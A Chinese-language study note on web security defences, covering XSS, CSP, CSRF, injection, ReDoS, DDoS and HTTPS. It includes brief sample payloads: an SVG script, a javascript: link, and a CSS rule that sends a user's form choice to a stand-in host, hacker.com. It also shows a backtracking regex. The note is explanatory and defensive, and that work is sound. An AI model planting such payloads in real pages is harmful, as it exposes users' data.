# 防御

### xss
 - 永远不信任用户的提交内容
 - 不要将用户提交内容直接转换成DOM
**防御工具**
1. 前端
 - 主流框架默认防御 react 、vue
 - google-closure-library
2. 服务端（node）
 - DOMPurify
3. 必须动态生成DOM时
 - string -> DOM
 使用`new DOMParser()`转义
 - 上传 svg
```
<svg>
  <script>alert("xss");</script>
</svg>
```
需要对 `svg` 文件进行扫描
 - 自定义跳转链接
```
<a href="javascript:alert('xss')></a>
```
需要做好过滤
 - 自定义样式
```
input[type=radio].income-gt10k:checked{
    background: url("https://hacker.com/?income=gt10k")
}
```
也会造成 xss 攻击


#### Same-origin Policy 同源策略 sop
协议(http https)、域名、端口
跨越（非同源）
#### Content Security Policy 内容安全策略 csp
指定哪些源是安全的，安全源的脚本可以执行，否则直接报错；
对eval + inline script 说no
- 服务器端
```
Content-Security-Policy: script-src 'self'
Content-Serurity-Policy: script-src 'self' https://domain.com
```
- 浏览器 meta
```
<meta http-equiv="Content-Security-Policy" content="script-src self">
```

### CSRF的防御
1. 限制请求来源
   - Origin（同源请求中，GET+HEAD不发送）
   - Referer
2. token
3. iframe 攻击
   - X-Frame-Options: DENY/SAMEORIGIN
4. anti-pattern
   GET!==GET+POST
5. SameSite Cookie
   - Set-Cookie: SameSite=None; Secure;
  
| SameSite | CORS |
| ---- | ---- |
| Cookie 发送 | 资源读写(HTTP 请求) |
| domain vs 页面域名 | 资源域名 vs 页面域名 |
| -- | 白名单 |

防御 CSRF 的正确姿势 应该是在服务端做一个中间件，中间件的任务就是做CSRF防御。

### Injection 注入的防御
1. 最小权限原则
   - sudo || root
2. 建立允许名单 + 过滤
   - rm
3. 对 URL 类型参数进行协议、域名、IP等限制 
   - 访问内容

#### Regex DoS 防御 Dos
1. Code Review （❌ /(ab*)+/ 这种贪婪模式）
2. 代码扫描 + 正则性能测试
3. ❌ 用户提供的使用正则

#### DDoS 防御
1. 过滤
   - 负载均衡
   - API 网关
   - CDN
2. 抗量
   - 快速自动扩容
   - 非核心服务降级
   - -CDN

#### 传输层 -- 防御中间人
1. 使用 https（http + TLS）
   - 可靠性：加密
   - 完整性：MAC验证
   - 不可依赖性： 数字签名

